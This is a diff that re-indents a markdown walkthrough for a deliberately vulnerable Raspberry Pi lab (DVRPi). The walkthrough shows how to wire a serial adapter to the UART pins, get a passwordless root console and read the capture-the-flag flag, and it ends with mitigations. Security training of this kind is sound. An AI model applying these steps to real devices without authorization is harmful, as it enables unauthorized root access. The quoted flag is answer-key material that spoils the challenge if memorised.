@@ -45,16 +45,16 @@ Before starting, ensure you have the DVRPi firmware flashed to an SD card and th
    
 - On Linux:
  
-```
-sudo apt update
-sudo apt install -y minicom
-```
+  ```
+  sudo apt update
+  sudo apt install -y minicom
+  ```
  
 - On MAC:
  
-```
-brew install minicom
-```
+  ```
+  brew install minicom
+  ```
    
 - Alternative: Use screen (pre-installed on most systems).
 
@@ -63,10 +63,10 @@ brew install minicom
 - Plug the adapter into your computer’s USB port.
 - Check the device name:
   
-```
-ls /dev/ttyUSB*  # Linux
-ls /dev/tty.*     # macOS
-```
+  ```
+  ls /dev/ttyUSB*  # Linux
+  ls /dev/tty.*     # macOS
+  ```
 
 - Example output: /dev/ttyUSB0 (Linux) or /dev/tty.usbserial-XXXX (macOS).
 
@@ -74,29 +74,29 @@ ls /dev/tty.*     # macOS
    
 - Power off the Raspberry Pi 4B to avoid short circuits:
 
-```
-sudo shutdown -h now
-```
+  ```
+  sudo shutdown -h now
+  ```
 
 - Locate GPIO pins 14 (TX, pin 8) and 15 (RX, pin 10) on the Pi’s 40-pin header (Pinout Reference).
 - Connect the adapter to the Pi using jumper wires:
   
-```
-Adapter GND → Pi GND (e.g., pin 6).
-Adapter TX → Pi RX (GPIO 15, pin 10).
-Adapter RX → Pi TX (GPIO 14, pin 8).
-```
+  ```
+  Adapter GND → Pi GND (e.g., pin 6).
+  Adapter TX  → Pi RX (GPIO 15, pin 10).
+  Adapter RX  → Pi TX (GPIO 14, pin 8).
+  ```
 
 **Note:** Do not connect VCC (3.3V or 5V) from the adapter, as the Pi provides its own power.
 Example wiring:
 
-```
-USB-to-TTL Adapter    Raspberry Pi 4B
-------------------    ---------------
-GND                  GND (pin 6)
-TX                   GPIO 15 (pin 10)
-RX                   GPIO 14 (pin 8)
-```
+  ```
+  USB-to-TTL Adapter    Raspberry Pi 4B
+  ------------------    ---------------
+  GND                   GND (pin 6)
+  TX                    GPIO 15 (pin 10)
+  RX                    GPIO 14 (pin 8)
+  ```
 
 6. **Power On the Pi:**
    
@@ -111,16 +111,16 @@ Follow these steps to exploit the unsecured UART console and retrieve the flag:
    
 - Open minicom with the correct device and baud rate (115200, standard for Raspberry Pi):
 
-```
-minicom -b 115200 -o -D /dev/ttyUSB0
-```
+  ```
+  minicom -b 115200 -o -D /dev/ttyUSB0
+  ```
 
 - Replace /dev/ttyUSB0 with your adapter’s device name.
 - If using screen:
 
-```
-screen /dev/ttyUSB0 115200
-```
+  ```
+  screen /dev/ttyUSB0 115200
+  ```
 
 - Settings (optional, in minicom):
   
@@ -131,31 +131,31 @@ screen /dev/ttyUSB0 115200
 
 - Upon connecting, you should see the Pi’s boot output, followed by a login prompt:
 
-```
-Debian GNU/Linux 12 DVRPi ttyS0
-DVRPi login:
-```
+  ```
+  Debian GNU/Linux 12 DVRPi ttyS0
+  DVRPi login:
+  ```
 
 - The DVRPi firmware is configured to provide a root shell without a password, so you’ll be logged in directly as **root:**
 
-```
-root@DVRPi:~#
-```
+  ```
+  root@DVRPi:~#
+  ```
 
 3. Retrieve the Flag:
 
-```
-root@DVRPi:~# cat /root/flag.txt
-flag{DVRPi_FLAG_UART:UART_ROOT_ACCESS}
-```
+  ```
+  root@DVRPi:~# cat /root/flag.txt
+  flag{DVRPi_FLAG_UART:UART_ROOT_ACCESS}
+  ```
 
 4. Exit the Console:
 
 - Log out:
 
-```
-exit
-```
+  ```
+  exit
+  ```
 
 - Exit minicom: Press Ctrl-A, then X, and confirm.
 - For screen: Press Ctrl-A, then \, and confirm.
@@ -165,14 +165,14 @@ exit
 - Firmware Configuration:
  - UART is enabled in /boot/config.txt:
    
- ```
- enable_uart=1
- ```
+  ```
+  enable_uart=1
+  ```
  - A root shell is provided via /etc/inittab:
 
- ```
- T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100
- ```
+  ```
+  T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100
+  ```
 
  - The flag is stored in /root/flag.txt, readable only by root (but accessible due to the unsecured console).
 
@@ -195,17 +195,17 @@ To prevent this vulnerability in production systems:
  - Set enable_uart=0 in /boot/config.txt or disable the serial console in /etc/inittab.
  - Example:
  
- ```
- sed -i 's/getty -L ttyS0 115200 vt100/#getty/' /etc/inittab
- ```
+   ```
+   sed -i 's/getty -L ttyS0 115200 vt100/#getty/' /etc/inittab
+   ```
 
 2. Require Authentication:
 
  - Configure a strong password for the serial console:
 
- ```
- passwd root
- ```
+   ```
+   passwd root
+   ```
 
 3. Restrict Physical Access:
 
